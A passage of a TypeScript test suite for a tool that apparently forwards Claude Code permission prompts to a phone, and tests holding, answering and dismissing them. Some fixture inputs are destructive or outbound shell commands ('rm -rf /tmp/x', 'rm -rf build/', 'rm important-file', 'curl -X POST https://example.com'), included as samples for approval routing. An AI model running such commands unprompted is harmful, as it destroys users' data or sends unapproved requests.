      expect(cards().map((q) => q.text)).toEqual(['Allow network access to example.com?']);
      expect(ptySubmits).toEqual([]);
    });

    test('wrapper mode: a subagent prompt that has not rendered does not hide a hook-less prompt', async () => {
      const { tracker } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        orphanDebounceMs: 5,
      });
      lockSession('claude-sub-quiet');
      // A main-agent hook already took the parked record's place, so the
      // next render cannot be the subagent's own (it would pair first).
      expect(
        await hookServer.firePermission({
          ...subCall('claude-sub-quiet'),
          hook_event_name: 'PermissionRequest',
        }),
      ).toBe('passthrough');
      hookServer.fire('PreToolUse', {
        ...subCall('claude-sub-quiet'),
        hook_event_name: 'PreToolUse',
        tool_input: { command: 'something else' },
      });
      // A hook-less prompt (here a sandbox network dialog) renders.
      tracker.onOrphanPTYPrompt({
        id: generateId(),
        text: 'Allow network access to example.com?',
        options: [
          { label: 'Yes', value: '1', isRecommended: true, isYes: false, isNo: false },
          { label: 'No', value: '2', isRecommended: false, isYes: false, isNo: false },
        ],
        allowsFreeText: false,
        isAnswered: false,
        source: 'pty',
      });
      await new Promise((resolve) => setTimeout(resolve, 40));
      expect(cards().map((q) => q.text)).toEqual(['Allow network access to example.com?']);
    });

    test('daemon mode: the deadline notice says remi attach, the only way left to answer', async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      build({
        realTracker: true,
        realMessageApi: true,
        hasLocalTerminal: false,
        holdMs: 20,
        noticeLog,
      });
      lockSession('claude-daemon-deadline');
      const hook = hookServer.firePermission({
        session_id: 'claude-daemon-deadline',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      });
      expect(await hook).toBe('passthrough');
      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline_no_terminal']);
    });

    test('daemon mode: Claude closing the request with no hook (No, Esc, its own timeout) dismisses the card before the long deadline', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const { handle } = build({
        realTracker: true,
        realMessageApi: true,
        hasLocalTerminal: false,
        holdMs: 3_540_000,
        broadcastResolvedLog,
        noticeLog,
      });
      lockSession('claude-daemon-autodeny');
      const claude = new AbortController();
      void hookServer.firePermission(
        {
          session_id: 'claude-daemon-autodeny',
          hook_event_name: 'PermissionRequest',
          tool_name: 'Bash',
          tool_input: { command: 'curl -X POST https://example.com' },
          permission_mode: 'auto',
        },
        claude.signal,
      );
      const card = cards()[0] as Question;
      // Claude closes the held request without firing a hook.
      claude.abort();
      expect(cards()).toHaveLength(0);
      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
      // Not a deadline: no "answer at the terminal" notice.
      expect(noticeLog).toEqual([]);
      expect(handle.gate.answerHeld(card.id, { kind: 'cancel' })).toBe('closed');
      expect(ptySubmits).toEqual([]);
    });

    test("daemon mode: an auto-mode fallback's 2:00 auto-deny arrives as PermissionDenied and dismisses the card before the long deadline", async () => {
      // Measured live on Claude Code 2.1.287 (#1126): the auto-deny fires
      // PermissionDenied for the held call 120 s after the prompt, before
      // any close of the request reaches remi.
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const { handle } = build({
        realTracker: true,
        realMessageApi: true,
        hasLocalTerminal: false,
        holdMs: 3_540_000,
        broadcastResolvedLog,
        noticeLog,
      });
      lockSession('claude-daemon-autodeny-pd');
      const call = {
        session_id: 'claude-daemon-autodeny-pd',
        tool_name: 'Bash',
        tool_input: { command: 'curl -X POST https://example.com' },
        permission_mode: 'auto',
      };
      hookServer.fire('PreToolUse', {
        ...call,
        hook_event_name: 'PreToolUse',
        tool_use_id: 'tu-autodeny',
      });
      const hook = hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' });
      const card = cards()[0] as Question;
      hookServer.fire('PermissionDenied', {
        ...call,
        hook_event_name: 'PermissionDenied',
        tool_use_id: 'tu-autodeny',
        reason: 'The server-side auto mode classifier judged this action dangerous',
      });
      expect(cards()).toHaveLength(0);
      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
      expect(noticeLog).toEqual([]);
      // The hold ends with the empty response; Claude has already decided.
      expect(await hook).toBe('passthrough');
      const yes = card.options.find((o) => o.isYes) as QuestionOption;
      expect(handle.gate.answerHeld(card.id, { kind: 'option', option: yes })).toBe('closed');
      expect(ptySubmits).toEqual([]);
    });

    test("daemon mode: a subagent's request pairs with its own PreToolUse, so only that call's PostToolUse closes it", async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        hasLocalTerminal: false,
        noticeLog,
      });
      lockSession('claude-sub-pair');
      const call = subCall('claude-sub-pair');
      hookServer.fire('PreToolUse', {
        ...call,
        hook_event_name: 'PreToolUse',
        tool_use_id: 'tu-sub',
      });
      let settled = false;
      const hook = hookServer
        .firePermission({ ...call, hook_event_name: 'PermissionRequest' })
        .then((d) => {
          settled = true;
          return d;
        });
      const card = cards()[0] as Question;
      // An identical call of the same agent with another id finishes: not
      // this prompt's call, so the hold and the card stay.
      hookServer.fire('PostToolUse', {
        ...call,
        hook_event_name: 'PostToolUse',
        tool_use_id: 'tu-twin',
      });
      await new Promise((resolve) => setTimeout(resolve, 5));
      expect(settled).toBe(false);
      expect(cards().map((q) => q.id)).toEqual([card.id]);
      expect(noticeLog).toEqual([]);
      // Its own call's PostToolUse (Yes answered at the terminal) closes it.
      hookServer.fire('PostToolUse', {
        ...call,
        hook_event_name: 'PostToolUse',
        tool_use_id: 'tu-sub',
      });
      expect(await hook).toBe('passthrough');
      expect(cards()).toHaveLength(0);
      expect(noticeLog).toEqual([]);
    });

    test("daemon mode: a held subagent card (its dialog not on screen) does not hide a main hook-less dialog's card", async () => {
      // End to end, with the tracker's live-question check wired the way
      // cli.ts wires it: the held subagent card is registered, but its
      // dialog does not render while held, so a hook-less main dialog
      // (sandbox network) rendering now must still reach the phone.
      const { tracker, handle } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        hasLocalTerminal: false,
        orphanDebounceMs: 5,
      });
      lockSession('claude-sub-held-hookless');
      const hook = hookServer.firePermission({
        ...subCall('claude-sub-held-hookless'),
        hook_event_name: 'PermissionRequest',
      });
      const held = cards();
      expect(held).toHaveLength(1);
      expect(held[0]?.agentId).toBe('agent-bg');
      tracker.onOrphanPTYPrompt({
        id: generateId(),
        text: 'Allow network access to example.com?',
        options: [
          { label: 'Yes', value: '1', isRecommended: true, isYes: false, isNo: false },
          { label: 'No', value: '2', isRecommended: false, isYes: false, isNo: false },
        ],
        allowsFreeText: false,
        isAnswered: false,
        source: 'pty',
      });
      await new Promise((resolve) => setTimeout(resolve, 40));
      expect(cards().map((q) => q.text)).toContain('Allow network access to example.com?');
      expect(ptySubmits).toEqual([]);
      handle.gate.forceRelease('test');
      await hook;
    });

    test('daemon mode: a held subagent prompt does not refuse chat (its dialog is not on screen)', async () => {
      const built = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        hasLocalTerminal: false,
      });
      lockSession('claude-sub-chat');
      const hook = hookServer.firePermission({
        ...subCall('claude-sub-chat'),
        hook_event_name: 'PermissionRequest',
      });
      expect(cards()).toHaveLength(1);
      const sent: ProtocolMessage[] = [];
      const handlers = createInputHandlers({
        sessionRegistry,
        bindingStore,
        send: (_c, m) => {
          sent.push(m);
          return true;
        },
        ...gateAnswerDeps(() => built.handle.gate),
        ...trackerScreenDeps(() => built.tracker),
        ...promptUpDeps(
          () => built.handle.gate,
          () => built.tracker,
        ),
      });
      sessionRegistry.attachConnection(SID, 'conn-sub-chat' as UUID);
      await handlers.onUserInput('conn-sub-chat' as UUID, SID, 'status?', false);
      expect(sent.find((m) => m.type === 'error')).toBeUndefined();
      expect(ptySubmits).toEqual(['status?']);
      built.handle.gate.forceRelease('test');
      await hook;
    });

    test('daemon mode: ten concurrent held cards are all kept past the pending cap, oldest still answerable', async () => {
      const { handle } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        hasLocalTerminal: false,
      });
      lockSession('claude-many-held');
      const hooks: Array<Promise<PermissionDecision>> = [];
      for (let i = 0; i < 10; i++) {
        hooks.push(
          hookServer.firePermission({
            session_id: 'claude-many-held',
            hook_event_name: 'PermissionRequest',
            agent_id: `agent-${i}`,
            agent_type: 'general-purpose',
            tool_name: 'Bash',
            tool_input: { command: `touch held-${i}.txt` },
          }),
        );
      }
      // Ten background agents each waiting on the phone: the cap (8) must
      // not drop a card whose hook is still held.
      const held = cards();
      expect(held).toHaveLength(10);
      const oldest = held[0] as Question;
      expect(oldest.text).toContain('touch held-0.txt');
      const yes = oldest.options.find((o) => o.isYes && !o.isNo) as QuestionOption;
      expect(handle.gate.answerHeld(oldest.id, { kind: 'option', option: yes })).toBe('resolved');
      expect(await hooks[0]).toBe('allow');
      handle.gate.forceRelease('test');
      await Promise.all(hooks);
    });

    test('daemon mode: held, an answerable card at once, the phone answer is the hook response', async () => {
      const { handle, tracker } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        hasLocalTerminal: false,
      });
      lockSession('claude-sub-daemon');
      const hook = hookServer.firePermission({
        ...subCall('claude-sub-daemon'),
        hook_event_name: 'PermissionRequest',
      });
      const card = cards()[0];
      if (!card) throw new Error('no card for the held subagent prompt');
      expect(card.agentId).toBe('agent-bg');
      const handlers = createInputHandlers({
        sessionRegistry,
        bindingStore,
        send: () => true,
        ...gateAnswerDeps(() => handle.gate),
        ...trackerScreenDeps(() => tracker),
        ...promptUpDeps(
          () => handle.gate,
          () => tracker,
        ),
      });
      expect(await handlers.relayAnswer(SID, card.id, 'No')).toBe('delivered');
      expect(await hook).toBe('deny');
      expect(ptySubmits).toEqual([]);
    });
  });

  describe('multi-choice / design escalations push at once (#625)', () => {
    test('an AskUserQuestion pushes exactly one held card, once, and it reaches the registry', async () => {
      // The immediate-push path end to end: gate -> holdForAnswer (#1127) ->
      // onHeldEscalate -> tracker.pushHeldHook -> MessageAPI -> registry,
      // with the real tracker and message API and the gate's default
      // ALWAYS_ESCALATE_TOOLS (no alwaysEscalateTools passed).
      const pushLog: Array<{ question: Question; held: boolean }> = [];
      const { tracker, handle } = build({ realTracker: true, realMessageApi: true, pushLog });
      hookServer.fire('Notification', {
        session_id: 'claude-auq-push',
        hook_event_name: 'Notification',
        transcript_path: path.join(tmpDir, 'claude-auq-push.jsonl'),
        notification_type: 'auth_success',
        message: '',
      });

      // Held (#1127): the decision waits for an answer, the card does not.
      const decision = hookServer.firePermission({
        session_id: 'claude-auq-push',
        hook_event_name: 'PermissionRequest',
        tool_name: 'AskUserQuestion',
        tool_input: {
          questions: [
            {
              question: 'Which database?',
              header: 'Database',
              multiSelect: false,
              options: [
                { label: 'Postgres', description: 'relational' },
                { label: 'SQLite', description: 'embedded' },
              ],
            },
          ],
        },
      });

      expect(pushLog).toHaveLength(1);
      expect(pushLog[0]?.held).toBe(true);
      const qid = pushLog[0]?.question.id;
      if (!qid) throw new Error('no card pushed');
      expect(sessionRegistry.getQuestion(SID, qid)).not.toBeNull();

      // A repeat push for the same id is a no-op (pushedHeldIds).
      expect(tracker.pushHeldHook(qid, 'structured')).toBe(false);
      expect(pushLog).toHaveLength(1);
      expect(
        [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])].filter(
          (q) => q.id === qid,
        ),
      ).toHaveLength(1);
      handle.gate.forceRelease('test');
      expect(await decision).toBe('passthrough');
    });
  });

  /**
   * #1134: a card answered by typing carries the screen's numbering, and a
   * typed digit is refused unless the screen's option at that value is the
   * same choice. Since #1126 only cards pushed by id before their render are
   * typed (multi-choice string-label permissions); a binary prompt, an
   * AskUserQuestion and an ExitPlanMode are held instead (#1126, #1127), and
   * the tests below pin that their answers never reach the PTY even with
   * Claude's own list on screen. Driven through the real bridge, gate,
   * tracker, MessageAPI and answer handler, with the live dialog parsed by
   * the real parser.
   */
  describe("phone answers use the screen's numbering (#1134)", () => {
    function lockSession(id: string): void {
      hookServer.fire('Notification', {
        session_id: id,
        hook_event_name: 'Notification',
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        notification_type: 'auth_success',
        message: '',
      });
    }

    function liveDialog(): Question {
      const parsed = parseQuestion(WRAPPED_DIRECTORY_DIALOG);
      if (!parsed.question) throw new Error('the live dialog did not parse as a prompt');
      return parsed.question;
    }

    function cards(): Question[] {
      return [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])];
    }

    /** The answer handler with every dep cli.ts wires for it, pointed at this
     *  session's gate handle and tracker. */
    function answerHandlers(tracker: QuestionPresenceTracker, sent: ProtocolMessage[]) {
      const gate = bridgeHandles[bridgeHandles.length - 1]?.gate;
      if (!gate) throw new Error('no bridge handle');
      return createInputHandlers({
        sessionRegistry,
        bindingStore,
        send: (_c, m) => {
          sent.push(m);
          return true;
        },
        ...gateAnswerDeps(() => gate),
        ...trackerScreenDeps(() => tracker),
        ...promptUpDeps(
          () => gate,
          () => tracker,
        ),
      });
    }

    test('a value the screen does not show is refused and nothing is typed', async () => {
      // A card pushed by id before its render carries the hook's numbering:
      // here a passthrough multi-choice escalation (four plain-string
      // suggestions) whose "No" is 4, over the live 3-option dialog. Its
      // "No" is the exact digit that approved the command in the live run.
      const { tracker } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
      });
      lockSession('claude-e5-stale');
      const decision = await hookServer.firePermission({
        session_id: 'claude-e5-stale',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'touch e5-marker.txt' },
        permission_suggestions: [
          'Yes',
          'Yes, allow directory',
          'Yes, switch to acceptEdits mode',
          'No',
        ],
      });
      expect(decision).toBe('passthrough');
      const card = cards()[0];
      if (!card) throw new Error('the passthrough escalation registered no card');
      expect(card.options.map((o) => o.value)).toEqual(['1', '2', '3', '4']);

      tracker.onOrphanPTYPrompt(liveDialog());
      expect(tracker.observedPromptOptions()?.map((o) => o.value)).toEqual(['1', '2', '3']);

      const logs: string[] = [];
      configureLogger({ writeLog: (msg) => logs.push(msg) });
      const sent: ProtocolMessage[] = [];
      await answerHandlers(tracker, sent).onAnswer('conn-e5' as UUID, SID, card.id, '4');

      expect(ptySubmits).toEqual([]);
      // Refused by the screen check, not by the presence guard before it.
      expect(logs.some((m) => m.includes('"4" is not an option on screen [1, 2, 3]'))).toBe(true);
      const errors = sent.filter((m) => m.type === 'error');
      expect(errors).toHaveLength(1);
      expect((errors[0] as { code?: string }).code).toBe('STALE_ANSWER');
      // Consumed like the other refusals: the card no longer matches the screen.
      expect(cards()).toHaveLength(0);
    });

    test('the same by-id multi-choice card: an identical "Yes" still types 1', async () => {
      const { tracker } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
      });
      lockSession('claude-e5-multi-yes');
      await hookServer.firePermission({
        session_id: 'claude-e5-multi-yes',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'touch e5-marker.txt' },
        permission_suggestions: [
          'Yes',
          'Yes, allow directory',
          'Yes, switch to acceptEdits mode',
          'No',
        ],
      });
      const card = cards()[0];
      if (!card) throw new Error('the passthrough escalation registered no card');
      tracker.onOrphanPTYPrompt(liveDialog());

      await answerHandlers(tracker, []).onAnswer('conn-e5' as UUID, SID, card.id, 'Yes');
      expect(ptySubmits).toEqual(['1']);
    });

    /**
     * ExitPlanMode is held and answered through its hook by meaning (#1127),
     * never typed. Claude 2.1.287 builds its own list; the screen below is
     * the e4-bare-classic capture's layout, re-spaced and fed through the
     * real parser, and it numbers "Keep planning" nowhere: the answer must
     * not depend on it.
     */
    describe("ExitPlanMode answered over Claude's own list (#1127)", () => {
      const PLAN = { plan: '# Plan\n1. Do the thing', planFilePath: '/p/plan.md' };

      async function planCard(sessionTag: string) {
        const { tracker } = build({
          realTracker: true,
          realMessageApi: true,
          liveQuestionDeps: true,
        });
        lockSession(sessionTag);
        const decision = hookServer.firePermission({
          session_id: sessionTag,
          hook_event_name: 'PermissionRequest',
          tool_name: 'ExitPlanMode',
          tool_input: PLAN,
        });
        const card = cards()[0];
        if (!card) throw new Error('ExitPlanMode pushed no card before its render');
        const parsed = parseQuestion(
          [
            ' Claude has written up a plan and is ready to execute. Would you like to proceed?',
            ' ❯ 1. Yes, auto-accept edits',
            '   2. Yes, manually approve edits',
            '   3. Tell Claude what to change',
            '      shift+tab to approve with this feedback',
            ' ctrl+g to edit in Nvim · ~/.claude/plans/x.md',
          ].join('\n'),
        );
        if (!parsed.question) throw new Error('the plan dialog did not parse');
        tracker.onOrphanPTYPrompt(parsed.question);
        return { tracker, card, decision };
      }

      test('"Keep planning" denies through the hook with "Keep planning."; nothing typed', async () => {
        const { tracker, card, decision } = await planCard('claude-plan-no');
        expect(card.kind).toBe('plan_approval');
        expect(card.detail).toBe(PLAN.plan);
        await answerHandlers(tracker, []).onAnswer(
          'conn-plan' as UUID,
          SID,
          card.id,
          'Keep planning',
        );
        expect(await decision).toEqual({ behavior: 'deny', message: 'Keep planning.' });
        expect(ptySubmits).toEqual([]);
      });

      test('"Approve, auto-accept edits" echoes the plan with a session setMode; nothing typed', async () => {
        const { tracker, card, decision } = await planCard('claude-plan-yes');
        await answerHandlers(tracker, []).onAnswer(
          'conn-plan' as UUID,
          SID,
          card.id,
          'Approve, auto-accept edits',
        );
        expect(await decision).toEqual({
          behavior: 'allow',
          updatedInput: PLAN,
          updatedPermissions: [{ type: 'setMode', mode: 'acceptEdits', destination: 'session' }],
        });
        expect(ptySubmits).toEqual([]);
      });

      test("Claude's own wording is not a plan answer: refused, the hold stays", async () => {
        const { tracker, card, decision } = await planCard('claude-plan-screen');
        const sent: ProtocolMessage[] = [];
        expect(
          await answerHandlers(tracker, sent).onAnswer(
            'conn-plan' as UUID,
            SID,
            card.id,
            'Yes, auto-accept edits',
          ),
        ).toBeUndefined();
        expect((sent.find((m) => m.type === 'error') as { code?: string })?.code).toBe(
          'STALE_ANSWER',
        );
        expect(cards().map((q) => q.id)).toEqual([card.id]);
        expect(ptySubmits).toEqual([]);
        bridgeHandles[bridgeHandles.length - 1]?.gate.forceRelease('test');
        expect(await decision).toBe('passthrough');
      });
    });

    test('AskUserQuestion: a lock-screen pick answers through the hook, even with the menu on screen', async () => {
      // A plain pick, as the extension's buttons and the HTTP relay send it
      // (an option's label or number), is matched to one option and answered
      // through the hook with that option's label in `answers` (#1127). The
      // menu below is
      // on screen and "SQLite" would match its row 2, which is exactly when
      // a typed digit used to go through; nothing may be typed now.
      const { tracker } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
      });
      lockSession('claude-auq');
      const input = {
        questions: [
          {
            question: 'Which database?',
            header: 'DB',
            multiSelect: false,
            options: [
              { label: 'Postgres', description: 'Relational' },
              { label: 'SQLite', description: 'Embedded' },
            ],
          },
        ],
      };
      const decision = hookServer.firePermission({
        session_id: 'claude-auq',
        hook_event_name: 'PermissionRequest',
        tool_name: 'AskUserQuestion',
        tool_input: input,
      });
      const card = cards()[0];
      if (!card) throw new Error('AskUserQuestion pushed no card before its render');
      expect(card.kind).toBe('multi_question');

      const parsed = parseQuestion(
        [
          ' Which database?',
          ' ❯ 1. Postgres',
          '      Relational',
          '   2. SQLite',
          '      Embedded',
          '   3. Type something.',
          ' Enter to select · ↑/↓ to navigate · Esc to cancel',
        ].join('\n'),
      );
      if (!parsed.question) throw new Error('the AskUserQuestion menu did not parse');
      tracker.onOrphanPTYPrompt(parsed.question);
      expect(cards()).toHaveLength(1);

      const outcome = await answerHandlers(tracker, []).relayAnswer(SID, card.id, 'SQLite');
      expect(outcome).toBe('delivered');
      expect(await decision).toEqual({
        behavior: 'allow',
        updatedInput: { ...input, answers: { 'Which database?': 'SQLite' } },
      });
      expect(ptySubmits).toEqual([]);
      expect(cards()).toHaveLength(0);
    });
  });

  test('#710: active Task context but UNTAGGED PermissionRequest escalates, not denies', async () => {
    // An untagged request is the main agent's even while a Task is open.
    const { handle } = build();

    hookServer.fire('Notification', {
      session_id: 'claude-noaa-task',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'noaatask.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    hookServer.fire('PreToolUse', {
      session_id: 'claude-noaa-task',
      hook_event_name: 'PreToolUse',
      tool_name: 'Task',
      tool_input: {},
      tool_use_id: 'tu_task_noaa',
    });

    const decision = hookServer.firePermission({
      session_id: 'claude-noaa-task',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });

    expect(messageApiLog.questionCalls).toBe(1); // escalated to the user, not silently denied
    handle.gate.forceRelease('test');
    expect(await decision).toBe('passthrough');
    expect(ptySubmits).toEqual([]);
  });

  test('#751: a genuinely subagent-TAGGED PermissionRequest (agent_id set) during an active Task context parks + passthrough', async () => {
    // agent_id present proves this really is a subagent prompt (not a leak).
    // #751 PTY-arbiter: instead of the old default-deny (silent teammate
    // breakage), the gate parks the rich question and answers 'passthrough' --
    // no PTY inject, no immediate push/registration; the question surfaces
    // only if Claude's native prompt renders on the PTY.
    build();

    hookServer.fire('Notification', {
      session_id: 'claude-esc-task-tagged',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'esctask-tagged.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    hookServer.fire('PreToolUse', {
      session_id: 'claude-esc-task-tagged',
      hook_event_name: 'PreToolUse',
      tool_name: 'Task',
      tool_input: { subagent_type: 'general-purpose', prompt: 'do stuff' },
      tool_use_id: 'tu_task_esc_tagged',
    });

    const decision = await hookServer.firePermission({
      session_id: 'claude-esc-task-tagged',
      agent_id: 'subagent-tagged-1',
      agent_type: 'general-purpose',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });

    expect(decision).toBe('passthrough');
    expect(ptySubmits).toEqual([]);
    // The park routes through recordPendingHook, which this harness's
    // PassthroughTracker collapses into an immediate PTY-visible push — i.e.
    // the simulated terminal rendered the prompt, so the parked question
    // surfaced. True park-until-render semantics are covered in
    // tests/api/question-presence-tracker.test.ts ("awaiting-PTY parking").
    expect(messageApiLog.questionCalls).toBe(1);
  });
  // ---------------------------------------------------------------------------
  // #799: a subagent/teammate permission question answered IN THE TERMINAL had
  // no removal path from sessionRegistry.currentQuestions. Fix: the gate now
  // registers a signature for a parked subagent escalation too, and the
  // subagent branches of PreToolUse/PostToolUse (which used to early-return
  // before ever reaching the gate) now call cancelExternallyResolved; a
  // SubagentStop resolves anything still open for that agent (the
  // rejected-in-the-terminal case no tool call ever announces).
  // ---------------------------------------------------------------------------
  describe('#799: subagent question purge', () => {
    function lock(id: string): void {
      // #930: SessionStart is no longer a registered/dispatched hook
      // event (Claude Code discards http-type hooks for it). Notification
      // with a neutral type locks the binder via the same onHookEvent()
      // first-adopt path with zero downstream side effects (handleNotification
      // no-ops for anything outside permission_prompt/idle_prompt/
      // elicitation_dialog).
      hookServer.fire('Notification', {
        session_id: id,
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        hook_event_name: 'Notification',
        notification_type: 'auth_success',
        message: '',
      });
    }

    test('a matching subagent PreToolUse resolves a parked permission (question_resolved fires)', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
      lock('claude-799-pre');

      const decision = hookServer.firePermission({
        session_id: 'claude-799-pre',
        agent_id: 'agent-799-1',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'git push' },
      });
      expect(broadcastResolvedLog).toHaveLength(0); // held (no local terminal), not resolved yet

      // The user answered directly in the terminal: Claude now runs the tool.
      hookServer.fire('PreToolUse', {
        session_id: 'claude-799-pre',
        agent_id: 'agent-799-1',
        agent_type: 'general-purpose',
        hook_event_name: 'PreToolUse',
        tool_name: 'Bash',
        tool_input: { command: 'git push' },
      });

      expect(broadcastResolvedLog).toHaveLength(1);
      expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
      expect(await decision).toBe('passthrough');
    });

    test('a matching subagent PostToolUse also resolves it', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
      lock('claude-799-post');

      const decision = hookServer.firePermission({
        session_id: 'claude-799-post',
        agent_id: 'agent-799-2',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls -la' },
      });
      expect(broadcastResolvedLog).toHaveLength(0);

      hookServer.fire('PostToolUse', {
        session_id: 'claude-799-post',
        agent_id: 'agent-799-2',
        agent_type: 'general-purpose',
        hook_event_name: 'PostToolUse',
        tool_name: 'Bash',
        tool_input: { command: 'ls -la' },
        tool_response: 'ok',
      });

      expect(broadcastResolvedLog).toHaveLength(1);
      expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
      expect(await decision).toBe('passthrough');
    });

    test('(b) a non-matching subagent PreToolUse leaves the parked permission open', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
      lock('claude-799-nomatch');

      void hookServer.firePermission({
        session_id: 'claude-799-nomatch',
        agent_id: 'agent-799-3',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'git push' },
      });

      hookServer.fire('PreToolUse', {
        session_id: 'claude-799-nomatch',
        agent_id: 'agent-799-3',
        agent_type: 'general-purpose',
        hook_event_name: 'PreToolUse',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf /tmp/x' }, // different command -> no signature match
      });

      expect(broadcastResolvedLog).toHaveLength(0);
    });

    test("SubagentStop resolves that agent's still-open permission (denied in the terminal, no tool call ever followed)", async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      const { tracker } = build({
        broadcastResolvedLog,
      });
      lock('claude-799-stop');

      await hookServer.firePermission({
        session_id: 'claude-799-stop',
        agent_id: 'agent-799-4',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'rm important-file' },
      });
      expect(broadcastResolvedLog).toHaveLength(0); // still open: no tool call ever fired (denied)
      // The park left a parked-awaiting-PTY tracker record for this agent.
      expect(tracker.awaitingPTYCountForTest()).toBe(1);

      hookServer.fire('SubagentStop', {
        session_id: 'claude-799-stop',
        agent_id: 'agent-799-4',
        agent_type: 'general-purpose',
      });

      // Never rendered, so never pushed: nothing to dismiss (#1125), but the
      // gate no longer tracks it either.
      expect(broadcastResolvedLog).toHaveLength(0);
      expect(bridgeHandles.at(-1)?.gate.forceRelease('probe')).toEqual({ resolved: 0 });
      // #799 review fix: SubagentStop must ALSO expire the tracker's parked
      // record (mirrors the PreToolUse-subagent branch's noteAgentAdvanced
      // pairing) -- otherwise it survives up to PARKED_RECORD_TTL_MS and can
      // pair with a later, unrelated PTY render for this agent key and
      // re-push a phantom card for a question already gone from the registry.
      expect(tracker.awaitingPTYCountForTest()).toBe(0);
    });

    test("never fires ambiguously: SubagentStop for one agent does not resolve a DIFFERENT agent's still-open permission", async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
      lock('claude-799-ambig');

      void hookServer.firePermission({
        session_id: 'claude-799-ambig',
        agent_id: 'agent-799-A',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'echo A' },
      });
      void hookServer.firePermission({
        session_id: 'claude-799-ambig',
        agent_id: 'agent-799-B',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'echo B' },
      });
      expect(broadcastResolvedLog).toHaveLength(0);

      // Only agent-A finished.
      hookServer.fire('SubagentStop', {
        session_id: 'claude-799-ambig',
        agent_id: 'agent-799-A',
        agent_type: 'general-purpose',
      });

      // Exactly ONE resolution -- agent-B's still-open permission is untouched.
      expect(broadcastResolvedLog).toHaveLength(1);
      expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
    });

    test('a matching subagent PostToolUseFailure resolves it (a failed tool still proves the permission was granted)', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
      lock('claude-799-failure');

      void hookServer.firePermission({
        session_id: 'claude-799-failure',
        agent_id: 'agent-799-5',
        agent_type: 'general-purpose',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf build/' },
      });
      expect(broadcastResolvedLog).toHaveLength(0);

      hookServer.fire('PostToolUseFailure', {
        session_id: 'claude-799-failure',
        agent_id: 'agent-799-5',
        agent_type: 'general-purpose',
        hook_event_name: 'PostToolUseFailure',
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf build/' },
        error: 'exit 1',
      });

      expect(broadcastResolvedLog).toHaveLength(1);
      expect(broadcastResolvedLog[0]?.reason).toBe('cancelled');
    });

    test('a non-matching subagent PostToolUseFailure leaves the parked permission open', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({ broadcastResolvedLog, realMessageApi: true, hasLocalTerminal: false });
      lock('claude-799-failure-nomatch');

      void hookServer.firePermission({
